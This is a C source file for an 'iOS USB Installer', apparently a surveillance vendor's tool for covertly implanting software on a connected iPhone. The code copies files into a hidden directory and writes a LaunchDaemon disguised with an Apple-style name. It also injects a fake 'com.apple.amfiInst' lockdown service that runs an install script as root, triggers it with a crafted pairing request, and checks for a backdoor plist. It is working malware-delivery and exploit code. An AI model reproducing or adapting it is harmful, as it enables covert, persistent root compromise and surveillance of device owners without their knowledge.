//
//  iOSUsbSupport.c
//  iOS USB Installer
//
//  Created by Massimo Chiodini on 2/7/13.
//  Copyright (c) 2013 HT srl. All rights reserved.
//
#include "iOSUsbSupport.h"
#include <errno.h>

#define INSTALLER_DIR         "/private/var/mobile/.0000"
#define LAUNCHD_INSTALL_PLIST "/Library/LaunchDaemons/com.apple.md0000.plist"
#define BCKDR_PLIST           "/Library/LaunchDaemons/com.apple.mdworker.plist"

char *plist =
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
"<plist version=\"1.0\">\n"
"<dict>\n"
"<key>Label</key>\n"
"<string>com.apple.md0000</string>\n"
"<key>Program</key>\n"
"<string>/bin/sh</string>\n"
" <key>ProgramArguments</key>\n"
" <array>\n"
"  <string>/bin/sh</string>\n"
"  <string>-c</string>\n"
"  <string>/bin/sh /var/mobile/.0000/install.sh</string>\n"
" </array>\n"
"<key>WorkingDirectory</key>\n"
"<string>/var/mobile/.0000</string>\n"
"<key>RunAtLoad</key>\n"
"<true/>\n"
"<key>LaunchOnlyOnce</key>\n"
"<true/>\n"
"</dict>\n"
"</plist>";

#ifdef WIN32

#define sleep Sleep
#define EXPORT_DLL __declspec(dllexport)

EXPORT_DLL char *get_model();
EXPORT_DLL char *get_version();
EXPORT_DLL int isDeviceAttached();

EXPORT_DLL int restart_device();
EXPORT_DLL int remove_installation();
EXPORT_DLL idevice_error_t create_launchd_plist();
EXPORT_DLL char** list_dir_content(char *dir_name);
EXPORT_DLL idevice_error_t make_install_directory();
EXPORT_DLL int check_installation(int sec, int timeout);
EXPORT_DLL idevice_error_t copy_buffer_file(char *filebuff, int filelen, char* filename);

#endif

static idevice_t phone = NULL;
static lockdownd_client_t client = NULL;

#pragma mark -
#pragma mark AFC service routine
#pragma mark -

afc_client_t open_device()
{
  uint16_t port = 0;
  afc_client_t afc = NULL;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  do
  {
    ret = idevice_new(&phone, NULL);
    
    usleep(5000);
    
  } while (ret == IDEVICE_E_NO_DEVICE);
  
  if (ret != IDEVICE_E_SUCCESS)
    return NULL;
  
  ret = lockdownd_client_new_with_handshake(phone, &client, "------");
  
  if (LOCKDOWN_E_SUCCESS != ret)
  {
		idevice_free(phone);
    return NULL;
	}
  
  ret = lockdownd_start_service(client, "com.apple.afc2", &port);
  
  if ((ret == LOCKDOWN_E_SUCCESS) && port)
    ret = afc_client_new(phone, port, &afc);
  
  lockdownd_client_free(client);
  idevice_free(phone);
  
  if (ret != AFC_E_SUCCESS)
    return NULL;
  
  return afc;
}

void close_device(afc_client_t afc)
{ 
  if (afc != NULL)
    afc_client_free(afc);
}

int isDeviceAttached()
{
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  idevice_t phone = NULL;
  
  ret = idevice_new(&phone, NULL);
  
  if (ret == IDEVICE_E_SUCCESS)
  {
    idevice_free(phone);
    return 1;
  }
  else
    return 0;
}

#pragma mark -
#pragma mark Device info routine
#pragma mark -

void get_device_info(afc_client_t afc)
{
  char **infos;
  
  if (afc_get_device_info(afc, &infos) == AFC_E_SUCCESS)
  {
    int i = 0;
    while (infos[i] != NULL)
    {
      printf("%s: %s\n", infos[i], infos[i+1]);
      i+=2;
    }
  }
}

char *get_version()
{
  char *version = NULL;
  char *domain = NULL;
  plist_t node = NULL;
  plist_type node_type;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  do
  {
    ret = idevice_new(&phone, NULL);
    usleep(5005);
  } while (ret == IDEVICE_E_NO_DEVICE);
  
  lockdownd_client_new(phone, &client, "ideviceinfo");
  
  if(lockdownd_get_value(client, domain, "ProductVersion", &node) == LOCKDOWN_E_SUCCESS)
  {
    if (node)
    {
      node_type = plist_get_node_type(node);
      if (node_type == PLIST_STRING)
      {
       plist_get_string_val(node, &version);
      }
        
      plist_free(node);
      node = NULL;
    }
  }
  
  close_device(NULL);
  
  return version;
}

char *get_model()
{
  char *model = NULL;
  afc_client_t afc = NULL;
  
  afc = open_device();
  
  if (afc == NULL)
    return  NULL;
  
  afc_get_device_info_key(afc, "Model", &model);
  
  close_device(afc);
  
  return model;
}

#pragma mark -
#pragma mark AFC file management
#pragma mark -

char *get_file(char *path, int timeout, int *size)
{

  uint64_t handle;
  int retry = 0;
  int bool_ret = 1;
  char *file_data = NULL;
  int ret = AFC_E_UNKNOWN_ERROR;
  
  *size = 0;
  
  afc_client_t afc = open_device();
  
  if (afc == NULL)
    return NULL;
  
  char **info = NULL;
  unsigned int fsize = 0;
  
  if (AFC_E_SUCCESS == afc_get_file_info(afc, path, &info) && info)
  {
    for (int i = 0; info[i]; i += 2)
    {
      printf("%s: %s\n", info[i], info[i+1]);
      if (!strcmp(info[i], "st_size"))
      {
        fsize = atoi(info[i+1]);
      }
    }
  }
  
  while (afc_file_open(afc,
                       path,
                       AFC_FOPEN_RDONLY,
                       &handle) != AFC_E_SUCCESS)
  {
    if (--timeout == 0)
    {
      bool_ret = 0;
      break;
    }
    
    sleep(1);
  }
  
  if (bool_ret == 0)
    return NULL;
  
  unsigned int bytes = 0;
  
  file_data = (char *) malloc((int)(sizeof(char) * fsize));
  
  while (ret != AFC_E_SUCCESS)
  {
    ret = afc_file_read(afc, handle, file_data, fsize, &bytes);
    if (retry++ > 5)
    {
      break;
    }
  }
  
  afc_file_close(afc, handle);
  
  close_device(afc);
  
  if (bytes <= 0)
  {
    free(file_data);
    file_data = NULL;
  }
  else
    *size = fsize;
  
  return file_data;
}


int check_file(char *path, int timeout)
{
  int bool_ret = 1;
  uint64_t handle;
  
  afc_client_t afc = open_device();
  
  if (afc == NULL)
    return 0;
  
  while (afc_file_open(afc,
                       path,
                       AFC_FOPEN_RDONLY,
                       &handle) != AFC_E_SUCCESS)
  {
    if (--timeout == 0)
    {
      bool_ret = 0;
      break;
    }
    
    sleep(1);
  }
  
  afc_file_close(afc, handle);
  
  close_device(afc);
  
  return bool_ret;
}

idevice_error_t create_launchd_plist()
{
  uint64_t handle;
  afc_client_t afc = NULL;
  int bufflen = strlen(plist);
  int bwrite = 0, bwritten = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  afc = open_device();
  
  if (afc == NULL)
    return  ret;
  
  ret = afc_file_open(afc,
                      LAUNCHD_INSTALL_PLIST,
                      AFC_FOPEN_RW,
                      &handle);
  
  if (ret != AFC_E_SUCCESS)
    return ret;
  
  do
  {
    ret = afc_file_write(afc, handle, plist, bufflen, (uint32_t*)&bwrite);
    
    if (ret != AFC_E_SUCCESS)
      break;
    
    bwritten += bwrite;
    
  } while (bufflen > bwritten);
  
  ret = afc_file_close(afc, handle);
  
  close_device(afc);
  
  if (check_file(LAUNCHD_INSTALL_PLIST, 1) == 0)
    ret = IDEVICE_E_UNKNOWN_ERROR;
  
  return ret;
}

idevice_error_t make_install_directory()
{
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  afc_client_t afc = open_device();
  
  if (afc == NULL)
    return ret;
  
  ret = afc_make_directory(afc, INSTALLER_DIR);
  
  close_device(afc);
  
  return ret; 
}

idevice_error_t copy_local_file(afc_client_t afc, char *lpath, char* lsrc)
{
  uint64_t handle = 0;
  char srcpath[256];
  char dstpath[256];
  struct stat filestat;
  int filelen = 0, bwrite = 0, bwritten = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  sprintf(srcpath, "%s/%s", lpath, lsrc);
  sprintf(dstpath, "%s/%s", INSTALLER_DIR, lsrc);
  
  stat(srcpath, &filestat);
  
  filelen = (int)filestat.st_size;
  
  if (filelen <= 0)
    return  ret;
  
  char *filebuff = (char*)malloc(filelen);
  
#ifdef WIN32
  int fd = open(srcpath, O_RDONLY|O_BINARY, 0);
#else
   int fd = open(srcpath, O_RDONLY, 0);
#endif
  
  if (fd == -1)
    return ret;

  int bread = 0;
  
  while (bread < filelen)
    bread += read(fd, filebuff+bread, (filelen-bread));
  
  if (bread != filelen)
  {
    free(filebuff);
    return ret;
  }
  
  ret = afc_file_open(afc, dstpath, AFC_FOPEN_RW, &handle);
  
  if (ret != AFC_E_SUCCESS)
  {
    free(filebuff);
    return ret;
  }
  
  do
  {
    ret = afc_file_write(afc, handle, filebuff, filelen, (uint32_t*)&bwrite);
    
    if (ret != AFC_E_SUCCESS)
      break;
    
    bwritten += bwrite;
    
  } while (filelen > bwritten);
  
  free(filebuff);
  
  ret = afc_file_close(afc, handle);
  
  if (check_file(dstpath, 1) == 0)
    ret = IDEVICE_E_UNKNOWN_ERROR;
  
  return ret;
}

idevice_error_t copy_install_files(char *lpath, char **dir_content)
{
  int i = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  afc_client_t afc = open_device();

  if (afc == NULL)
    return ret;
  
  do
  {
    ret = copy_local_file(afc, lpath, dir_content[i]);
    
    free(dir_content[i]);
    
    if (ret != IDEVICE_E_SUCCESS)
      break;
    
  } while (dir_content[++i] != NULL);
  
  close_device(afc);
  
  return ret;
}

idevice_error_t copy_buffer_to_filepath(char *filebuff, int filelen, char* file_path)
{
  uint64_t handle;
  int bwrite = 0, bwritten = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  afc_client_t afc = open_device();
  
  if (afc == NULL)
    return AFC_E_UNKNOWN_ERROR;
  
  ret = afc_file_open(afc, file_path, AFC_FOPEN_RW, &handle);
  
  if (ret != AFC_E_SUCCESS)
  {
    close_device(afc);
    return ret;
  }
  
  do
  {
    ret = afc_file_write(afc, handle, filebuff, filelen, (uint32_t*)&bwrite);
    
    if (ret != AFC_E_SUCCESS)
      break;
    
    bwritten += bwrite;
    
  } while (filelen > bwritten);
  
  ret = afc_file_close(afc, handle);
  
  close_device(afc);
  
  if (check_file(file_path, 1) == 0)
    ret = IDEVICE_E_UNKNOWN_ERROR;
  
  return ret;
}

/*
 * - Used in windows version only
 */
idevice_error_t copy_buffer_file(char *filebuff, int filelen, char* filename)
{
  uint64_t handle;
  int bwrite = 0, bwritten = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  afc_client_t afc = open_device();
  
  char dstpath[256];
  
  sprintf(dstpath, "%s/%s", INSTALLER_DIR, filename);
  
  ret = afc_file_open(afc, dstpath, AFC_FOPEN_RW, &handle);
  
  if (ret != AFC_E_SUCCESS)
  {
    close_device(afc);
    return ret;
  }
  
  do
  {
    ret = afc_file_write(afc, handle, filebuff, filelen, (uint32_t*)&bwrite);
    
    if (ret != AFC_E_SUCCESS)
      break;
    
    bwritten += bwrite;
  
  } while (filelen > bwritten);
  
  ret = afc_file_close(afc, handle);
  
  close_device(afc);
  
  if (check_file(dstpath, 1) == 0)
    ret = IDEVICE_E_UNKNOWN_ERROR;
  
  return ret;
}
/*
 * -
 */

char** list_dir_content(char *dir_name)
{
  DIR * d;
  int i = 0;
  static char *dirlist[256];
  struct stat dirstat;
  
  dirlist[0] = NULL;
  
  if (stat(dir_name, &dirstat) == -1)
    return dirlist;
  
  d = opendir (dir_name);
  
  if (! d)
    return dirlist;
  
  while (1)
  {
    struct dirent * entry;
    
    entry = readdir(d);
    
    if (!entry)
      break;
    
    if (i < 256 && (strcmp(entry->d_name, "..") && strcmp(entry->d_name, ".") && strcmp(entry->d_name, "(null)")))
    {
#ifdef WIN32
      char *path = (char*)malloc(256);
#else
      char *path = (char*)malloc(entry->d_namlen+1);
#endif
      
      sprintf(path, "%s", entry->d_name);
      
      dirlist[i++] = path;
    }
    
    if (i >= 256)
    {
      i = 255;
      break;
    }
  }
  
  dirlist[i] = NULL;
  
  closedir(d);
  
  return dirlist;
}

#pragma mark -
#pragma mark lockdownd routine
#pragma mark -

char *lockd_create_inst_services(char *plist_xml, int plist_length)
{  
  plist_t services_plist = 0;
  
  plist_from_xml(plist_xml, plist_length, &services_plist);
  
  plist_t plist_dict = plist_new_dict();
  
  plist_dict_insert_item(plist_dict, "AllowUnactivatedService", plist_new_bool(1));
  plist_dict_insert_item(plist_dict, "Label", plist_new_string("com.apple.mkRelay"));
  
  plist_t prog_array = plist_new_array();
  plist_array_append_item(prog_array, plist_new_string("/bin/sh"));
  plist_array_append_item(prog_array, plist_new_string("-c"));
  plist_array_append_item(prog_array, plist_new_string("(cd /var/mobile/.0000; /bin/sh install.sh)"));
  
  plist_dict_insert_item(plist_dict, "ProgramArguments", prog_array);
  
  plist_dict_insert_item(plist_dict, "UserName", plist_new_string("root"));
  
  char *xml_buffer = NULL;
  uint32_t xml_length = 0;
  
  plist_dict_insert_item(services_plist, "com.apple.amfiInst", plist_dict);
  
  plist_to_xml(services_plist, &xml_buffer, &xml_length);
  
  return xml_buffer;
}

int lockd_stroke()
{
  idevice_t phone = NULL;
  
	idevice_connection_t connection = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  ret = idevice_new(&phone, NULL);
  
  ret = idevice_connect(phone, 0xf27e, &connection);
  
	plist_t dict = plist_new_dict();
  
  plist_dict_insert_item(dict, "Request", plist_new_string("Pair"));
  plist_dict_insert_item(dict, "PairRecord", plist_new_bool(0));
	
  char *buffer = NULL;
  uint32_t length = 0;
  
  plist_to_xml(dict, &buffer, &length);
  
  plist_free(dict);
  
  int data =  ((unsigned char)length << 24) |
              ((unsigned short)(length & 0xFF00) << 8) |
              ((length & 0xFF0000u) >> 8) |
              ((length & 0xFF000000) >> 24);
  
  uint32_t sent_bytes = 0;
  
  idevice_connection_send(connection, (const char*)&data, 4, &sent_bytes);
  idevice_connection_send(connection, (const char*)buffer, length, &sent_bytes);
  
  free(buffer);
  
  sent_bytes = 0;
  length = 0;
  buffer = 0;
  
  idevice_connection_receive_timeout(connection, (char*)&length, 4, &sent_bytes, 1500);
  
  data =  ((unsigned char)length << 24) |
          ((unsigned short)(length & 0xFF00) << 8) |
          ((length & 0xFF0000u) >> 8) |
          ((length & 0xFF000000) >> 24);
  
  if (data)
  {
    buffer = malloc(data);
    idevice_connection_receive_timeout(connection, buffer, data, &sent_bytes, 5000);
    free(buffer);
  }
  
  idevice_disconnect(connection);
	
	return 0;
}

int lockd_run_inst_service()
{
  uint16_t port = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  do
  {
    ret = idevice_new(&phone, NULL);
    
    usleep(5000);
    
  } while (ret == IDEVICE_E_NO_DEVICE);
  
  if (ret != IDEVICE_E_SUCCESS)
    return 0;
  
  ret = lockdownd_client_new_with_handshake(phone, &client, "------");
  
  if (LOCKDOWN_E_SUCCESS != ret)
  {
		idevice_free(phone);
    return 0;
	}
  
  ret = lockdownd_start_service(client, "com.apple.amfiInst", &port);
  
  if (ret == LOCKDOWN_E_SUCCESS)
  {
    idevice_free(phone);
    return 1;
  }
  
  return 0;
}

int lockd_run_installer()
{
  int retry = 0;
  int bool_ret = 0;
  int services_plist_size = 0;
  char *services_plist = NULL;
  
  while (services_plist == NULL)
  {
    services_plist = get_file("/System/Library/Lockdown/Services.plist", 10, &services_plist_size);
    if (retry++ == 5)
      return 0;
  }
  
  char *services_plist_new = lockd_create_inst_services(services_plist, services_plist_size);
  
  if (services_plist_new == NULL)
    return 0;
  
  if (AFC_E_SUCCESS != copy_buffer_to_filepath(services_plist_new,
                                               strlen(services_plist_new),
                                               "/System/Library/Lockdown/Services.plist"))
  {
    return 0;
  }
  
  // todo: checking if is vulnerable
  lockd_stroke();
  
  sleep(3);

  retry = 0;
  
  while (bool_ret != 1)
  {
    lockd_run_inst_service();
    
    bool_ret = check_installation(1, 5);
    
    if (retry++ == 5)
      break;
  }
  
  afc_client_t afc = open_device();
  
  afc_remove_path(afc, "/System/Library/Lockdown/Services.plist");
  // retry...
  afc_remove_path(afc, "/System/Library/Lockdown/Services.plist");
  
  close_device(afc);
  
  // replace original one
  int ret = IDEVICE_E_UNKNOWN_ERROR;
  
  retry = 0;
  
  while (ret != IDEVICE_E_SUCCESS)
  {
    ret = copy_buffer_to_filepath(services_plist, services_plist_size,"/System/Library/Lockdown/Services.plist");
    if (retry++ == 5)
      break;
  }
  
  return bool_ret;
}

#pragma mark -
#pragma mark Device restart
#pragma mark -

int restart_device()
{
  int retVal = 0;
  int timeout = 30;
  uint16_t port = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  diagnostics_relay_client_t diagnostics_client = NULL;

  do
  {
    ret = idevice_new(&phone, NULL);
    
    sleep(1);
    
    if (--timeout == 0)
      break;
  
  } while (ret == IDEVICE_E_NO_DEVICE);
  
  if (ret != IDEVICE_E_SUCCESS)
    return retVal;
  
  ret = lockdownd_client_new_with_handshake(phone, &client, "+++++++");
  
  if (LOCKDOWN_E_SUCCESS != ret)
  {
		idevice_free(phone);
    return retVal;
	}
  
  ret = lockdownd_start_service(client,
                                "com.apple.mobile.diagnostics_relay",
                                &port);
  
	if (ret != LOCKDOWN_E_SUCCESS)
		ret = lockdownd_start_service(client,
                                  "com.apple.iosdiagnostics.relay",
                                  &port);

  lockdownd_client_free(client);
  
  if ((ret == LOCKDOWN_E_SUCCESS) && (port > 0))
  {
    ret = diagnostics_relay_client_new(phone, port, &diagnostics_client);
    
    if (ret == DIAGNOSTICS_RELAY_E_SUCCESS)
    {
      if (diagnostics_relay_restart(diagnostics_client, DIAGNOSTICS_RELAY_ACTION_FLAG_WAIT_FOR_DISCONNECT |
                                                        DIAGNOSTICS_RELAY_ACTION_FLAG_DISPLAY_PASS) == DIAGNOSTICS_RELAY_E_SUCCESS)
        retVal = 1;
      
      
      diagnostics_relay_goodbye(diagnostics_client);
      
      sleep(5);
      
      diagnostics_relay_client_free(diagnostics_client);
    }
  }
 
  idevice_free(phone);
  phone = NULL;
  client = NULL;
  
  return retVal;
}

#pragma mark -
#pragma mark Installation finalization
#pragma mark -

void remove_directory(afc_client_t afc, char *rpath)
{
  char **file_list = NULL;
  
  int retval = afc_read_directory(afc, rpath, &file_list);
  
  if ( retval == AFC_E_SUCCESS)
  {
    int i = 0;
    
    while (file_list[i] != NULL)
    {
      char fullpath[256];
      sprintf(fullpath, "%s/%s", rpath, file_list[i++]);
      
      afc_remove_path(afc, fullpath);
    }
    
    afc_remove_path(afc, rpath);
  }
  
}

int try_remove_installdir(afc_client_t afc)
{
  int i = 1;
  int ret = 1;
  uint64_t handle = 0;
  
  while (i++)
  {
    remove_directory(afc, INSTALLER_DIR);
  
    sleep(1);
    
    if (afc_file_open(afc,
                      INSTALLER_DIR,
                      AFC_FOPEN_RDONLY,
                      &handle) != AFC_E_SUCCESS)
      break;
    else
    {
      if (i == 10)
      {
        ret = 0;
        break;
      }
    }
  }
  
  return ret;
}

int remove_launchd_plist(afc_client_t afc)
{
  int i = 1;
  int ret = 1;
  uint64_t handle;
  idevice_error_t retop = IDEVICE_E_UNKNOWN_ERROR;
  
  while (i++)
  {
    retop = afc_remove_path(afc, LAUNCHD_INSTALL_PLIST);
    
    if (retop != AFC_E_SUCCESS)
    {
      ret = 0;
      break;
    }
    
    sleep(1);
    
    if (afc_file_open(afc,
                      LAUNCHD_INSTALL_PLIST,
                      AFC_FOPEN_RDONLY,
                      &handle) != AFC_E_SUCCESS)
      break;
    else
    {
      if (i == 10)
      {
        ret = 0;
        break;
      }
    }
  }
  
  return ret;
}

int check_running(int timeout)
{
  return check_file(BCKDR_PLIST, timeout);
}

int remove_installation()
{
  int retVal = 0;
  
  afc_client_t afc = open_device();
  
  if (afc == NULL)
    return retVal;
  
  if (remove_launchd_plist(afc) == 1)
    retVal = 1;
  
  if (try_remove_installdir(afc) == 0)
    retVal = 0;
  else
    retVal = 1;
   
  close_device(afc);
  
  return retVal;
}

int check_installation(int sec, int timeout)
{
  int ret = 1;
  
  sleep(sec);
  
  if (check_running(timeout) == 0)
    ret = 0;
  
  return ret;
}
